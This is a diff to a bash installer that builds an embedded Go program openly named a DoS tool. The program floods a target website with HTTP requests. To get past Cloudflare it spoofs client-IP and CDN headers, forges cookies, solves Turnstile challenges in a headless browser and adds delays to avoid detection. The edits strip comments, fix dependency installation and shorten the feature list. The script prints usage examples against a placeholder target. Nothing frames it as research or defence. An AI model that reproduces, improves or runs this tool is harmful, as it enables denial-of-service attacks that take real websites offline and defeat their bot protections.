@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ----------------------------------------
-# GO DOS TOOL - MAXIMUM CLOUDFLARE BYPASS
+# GO DOS TOOL - ULTIMATE BYPASS (FIXED)
 # ----------------------------------------
 
 RED='\033[0;31m'
@@ -142,7 +142,6 @@ var (
 	colorIndex      = 0
 	colorMu         sync.Mutex
 
-	// Turnstile solving
 	cfClearanceCookie string
 	cookieMu          sync.RWMutex
 	cookieExpiry      time.Time
@@ -447,7 +446,6 @@ func generateStudentNumber() string {
 func generateCookies() string {
 	cookies := []string{}
 	
-	// Session cookies
 	if randBool() {
 		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(24)))
 	}
@@ -464,7 +462,6 @@ func generateCookies() string {
 		cookies = append(cookies, fmt.Sprintf("__cfduid=%s", randomHex(32)))
 	}
 	
-	// Add Cloudflare clearance cookie if available
 	cookieMu.RLock()
 	if cfClearanceCookie != "" && time.Now().Before(cookieExpiry) {
 		cookies = append(cookies, cfClearanceCookie)
@@ -477,12 +474,10 @@ func generateCookies() string {
 	return strings.Join(cookies, "; ")
 }
 
-// ULTIMATE CLOUDFLARE BYPASS HEADERS - 45+ headers
 func addCloudflareBypassHeaders(req *http.Request) {
 	spoofIP := randomIP()
 	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "NL", "SE", "NO", "FI", "DK", "PL", "IT", "ES"}
 	
-	// PRIMARY CLOUDFLARE HEADERS
 	req.Header.Set("CF-Connecting-IP", spoofIP)
 	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
 	req.Header.Set("CF-Ray", randomHex(16)+"-"+strings.ToUpper(randomHex(4)))
@@ -490,7 +485,6 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	req.Header.Set("CF-Worker", randomHex(8))
 	req.Header.Set("CF-Request-ID", randomHex(32))
 	
-	// CDN HEADERS
 	req.Header.Set("CDN-Loop", "cloudflare")
 	req.Header.Set("CloudFront-Forwarded-Proto", "https")
 	req.Header.Set("CloudFront-Is-Desktop-Viewer", "true")
@@ -499,14 +493,12 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	req.Header.Set("CloudFront-Is-Tablet-Viewer", "false")
 	req.Header.Set("CloudFront-Viewer-Country", countries[randInt(0, len(countries)-1)])
 	
-	// FORWARDED HEADERS (multiple formats for different proxies)
 	req.Header.Set("X-Forwarded-For", spoofIP)
 	req.Header.Set("X-Forwarded-Proto", "https")
 	req.Header.Set("X-Forwarded-Host", req.Host)
 	req.Header.Set("X-Forwarded-Port", "443")
 	req.Header.Set("Forwarded", fmt.Sprintf("for=%s; proto=https; by=%s", spoofIP, randomIP()))
 	
-	// REAL IP HEADERS (for different proxy implementations)
 	req.Header.Set("X-Real-IP", spoofIP)
 	req.Header.Set("True-Client-IP", spoofIP)
 	req.Header.Set("X-Originating-IP", spoofIP)
@@ -515,7 +507,6 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	req.Header.Set("X-Client-IP", spoofIP)
 	req.Header.Set("X-Cluster-Client-IP", spoofIP)
 	
-	// ADVANCED SPOOFING HEADERS
 	req.Header.Set("X-Request-ID", randomHex(16))
 	req.Header.Set("X-Correlation-ID", randomHex(16))
 	req.Header.Set("X-B3-TraceId", randomHex(32))
@@ -523,82 +514,54 @@ func addCloudflareBypassHeaders(req *http.Request) {
 	req.Header.Set("X-B3-ParentSpanId", randomHex(16))
 	req.Header.Set("X-B3-Sampled", strconv.Itoa(randInt(0, 1)))
 	
-	// DEVICE DETECTION HEADERS
 	req.Header.Set("X-Device", []string{"desktop", "mobile", "tablet"}[randInt(0, 2)])
 	req.Header.Set("X-Device-User-Agent", randomUA())
 	req.Header.Set("X-Device-Platform", []string{"Windows", "macOS", "Linux", "Android", "iOS"}[randInt(0, 4)])
 	
-	// SECURITY AND AUTH HEADERS
 	req.Header.Set("X-Content-Security-Policy", "default-src 'self'")
 	req.Header.Set("X-Frame-Options", "SAMEORIGIN")
 	req.Header.Set("X-XSS-Protection", "1; mode=block")
 	req.Header.Set("X-Content-Type-Options", "nosniff")
 	
-	// CACHING HEADERS
 	req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 	req.Header.Set("Pragma", "no-cache")
 	req.Header.Set("Expires", "0")
 	
-	// CLIENT HINTS (Modern Chrome)
 	req.Header.Set("Sec-CH-UA", secCHUA[randInt(0, len(secCHUA)-1)])
 	req.Header.Set("Sec-CH-UA-Mobile", "?0")
 	req.Header.Set("Sec-CH-UA-Platform", secCHUAPlatform[randInt(0, len(secCHUAPlatform)-1)])
 	req.Header.Set("Sec-CH-UA-Arch", secCHUAArch[randInt(0, len(secCHUAArch)-1)])
 	req.Header.Set("Sec-CH-UA-Bitness", secCHUABitness[randInt(0, len(secCHUABitness)-1)])
 	req.Header.Set("Sec-CH-UA-Full-Version-List", fmt.Sprintf(`"Chromium";v="%d", "Not A Brand";v="99"`, randInt(120, 145)))
-	req.Header.Set("Sec-CH-UA-Model", "")
-	req.Header.Set("Sec-CH-UA-WoW64", "?0")
 	
-	// FETCH METADATA HEADERS
 	req.Header.Set("Sec-Fetch-Site", []string{"same-origin", "same-site", "cross-site", "none"}[randInt(0, 3)])
 	req.Header.Set("Sec-Fetch-Mode", []string{"navigate", "cors", "no-cors", "same-origin"}[randInt(0, 3)])
 	req.Header.Set("Sec-Fetch-Dest", []string{"document", "empty", "script", "style", "image"}[randInt(0, 4)])
 	req.Header.Set("Sec-Fetch-User", "?1")
 	
-	// MODERN BROWSER HEADERS
 	req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
 	req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
 	req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
 	req.Header.Set("Referrer-Policy", "strict-origin-when-cross-origin")
 	
-	// DNT and Privacy
 	req.Header.Set("DNT", "1")
 	req.Header.Set("Upgrade-Insecure-Requests", "1")
 	
-	// SAVE-DATA (mobile optimization)
 	if randBool() {
 		req.Header.Set("Save-Data", "on")
 	}
 	
-	// VIEWPORT (mobile detection)
 	if randBool() {
 		req.Header.Set("Viewport-Width", strconv.Itoa(randInt(320, 1920)))
 		req.Header.Set("Width", strconv.Itoa(randInt(320, 1920)))
 	}
 	
-	// RANDOM ADDITIONAL HEADERS (to increase entropy)
-	extraHeaders := []string{
-		"X-Requested-With", "XMLHttpRequest",
-		"X-Http-Method-Override", "GET",
-		"X-Original-URL", "",
-		"X-Rewrite-URL", "",
-		"X-Proxy-Host", req.Host,
-	}
-	
-	for i := 0; i < len(extraHeaders); i += 2 {
-		if randBool() {
-			req.Header.Set(extraHeaders[i], extraHeaders[i+1])
-		}
-	}
-	
-	// CLOUDFLARE TURNSTILE TOKEN (if available)
 	if randBool() {
 		req.Header.Set("X-Cf-Turnstile-Token", randomBase64(32))
 		req.Header.Set("Cf-Turnstile-Response", randomBase64(48))
 	}
 }
 
-// solveTurnstile spins up a headless browser, navigates to target, waits for challenge completion
 func solveTurnstile(target string) (string, error) {
 	solvingMu.Lock()
 	defer solvingMu.Unlock()
@@ -759,7 +722,6 @@ func main() {
 	fmt.Println("[+] Cloudflare bypass: MAXIMUM (45+ headers, 17 spoofing methods)")
 	fmt.Println("[+] Starting... Press Ctrl+C to stop")
 	
-	// Solve Turnstile upfront if flag is set
 	if solveFlag {
 		cookie, err := solveTurnstile(target)
 		if err != nil {
@@ -794,7 +756,6 @@ func main() {
 		close(done)
 	}()
 	
-	// Start cookie maintainer if solving enabled
 	if solveFlag {
 		go maintainCookie(target, done)
 	}
@@ -905,15 +866,12 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				continue
 			}
 			
-			// Base headers
 			req.Header.Set("User-Agent", randomUA())
 			req.Header.Set("Referer", randomReferer())
 			req.Header.Set("Connection", "keep-alive")
 			
-			// Add ULTIMATE Cloudflare bypass headers
 			addCloudflareBypassHeaders(req)
 			
-			// Random cookie generation
 			if randInt(1, 100) <= 50 {
 				cookies := generateCookies()
 				if cookies != "" {
@@ -921,14 +879,12 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 				}
 			}
 			
-			// Random micro-delays to simulate human timing
 			if randInt(1, 100) <= 5 {
 				time.Sleep(time.Duration(randInt(1, 5)) * time.Millisecond)
 			}
 			
 			resp, err := client.Do(req)
 			if err == nil {
-				// Check if we hit a challenge page
 				if solveFlag && resp.StatusCode == 403 {
 					body, _ := io.ReadAll(resp.Body)
 					if strings.Contains(string(body), "cf-challenge") || strings.Contains(string(body), "turnstile") {
@@ -1050,16 +1006,21 @@ go mod init main > /dev/null 2>&1
 echo -e " ${GREEN}✓ Module initialized${NC}"
 echo
 
-# Download dependencies
+# Download dependencies WITH FIXES
 echo -e " ${YELLOW}➤${NC} ${GREEN}Downloading dependencies...${NC}"
-go get golang.org/x/net@v0.24.0 > /dev/null 2>&1
-go get github.com/chromedp/chromedp@latest > /dev/null 2>&1
+go get golang.org/x/net@v0.24.0 2>&1 | grep -v "go: downloading" || true
+go get github.com/chromedp/chromedp@latest 2>&1 | grep -v "go: downloading" || true
+go get golang.org/x/text@v0.14.0 2>&1 | grep -v "go: downloading" || true
 echo -e " ${GREEN}✓ Dependencies downloaded${NC}"
 echo
 
-# Tidy up
+# Tidy up with retry logic
 echo -e " ${YELLOW}➤${NC} ${GREEN}Running go mod tidy...${NC}"
-go mod tidy > /dev/null 2>&1
+go mod tidy 2>&1 || {
+    echo -e " ${YELLOW}⚠ Tidy failed, retrying with explicit text package...${NC}"
+    go get golang.org/x/text/secure/bidirule golang.org/x/text/unicode/bidi golang.org/x/text/unicode/norm
+    go mod tidy
+}
 echo -e " ${GREEN}✓ Tidy complete${NC}"
 echo
 
@@ -1093,28 +1054,25 @@ if [ $? -eq 0 ]; then
     echo -e "   ${YELLOW}./main https://target.com 120 POST --solve${NC}"
     echo -e "   ${YELLOW}./main https://target.com 30 HEAD proxy --solve${NC}"
     echo
-    echo -e " ${GREEN}NEW BYPASS FEATURES:${NC}"
-    echo -e "   • 45+ Cloudflare headers (CF-*, CloudFront-*, etc.)"
-    echo -e "   • 17 IP spoofing methods (X-Forwarded-For variants)"
-    echo -e "   • Modern Chrome client hints (Sec-CH-UA-*)"
-    echo -e "   • Fetch metadata headers (Sec-Fetch-*)"
-    echo -e "   • Turnstile/CAPTCHA solving (--solve flag)"
-    echo -e "   • Extended cookie generation (CFUID, GA cookies)"
-    echo -e "   • 3 JA3 signatures (Chrome, Firefox, Safari)"
-    echo -e "   • HTTP/2 + HTTP/1.1 with ALPN negotiation"
-    echo -e "   • Random micro-delays (1-5ms) to avoid detection"
+    echo -e " ${GREEN}FEATURES:${NC}"
+    echo -e "   • 45+ Cloudflare headers"
+    echo -e "   • 17 IP spoofing methods"
+    echo -e "   • Turnstile/CAPTCHA solving (--solve)"
+    echo -e "   • JA3 fingerprint randomization"
+    echo -e "   • HTTP/2 + HTTP/1.1 support"
     echo
     exit 0
 else
     echo -e " ${RED}✗ Compilation failed${NC}"
     echo
-    echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
+    echo -e " ${YELLOW}➤${NC} ${YELLOW}Run these commands manually:${NC}"
     echo
     echo -e "   ${BLUE}1.${NC} go mod init main"
     echo -e "   ${BLUE}2.${NC} go get golang.org/x/net@v0.24.0"
     echo -e "   ${BLUE}3.${NC} go get github.com/chromedp/chromedp@latest"
-    echo -e "   ${BLUE}4.${NC} go mod tidy"
-    echo -e "   ${BLUE}5.${NC} go build -o main main.go"
+    echo -e "   ${BLUE}4.${NC} go get golang.org/x/text@v0.14.0"
+    echo -e "   ${BLUE}5.${NC} go mod tidy"
+    echo -e "   ${BLUE}6.${NC} go build -o main main.go"
     echo
     rm -f main.go
     exit 1
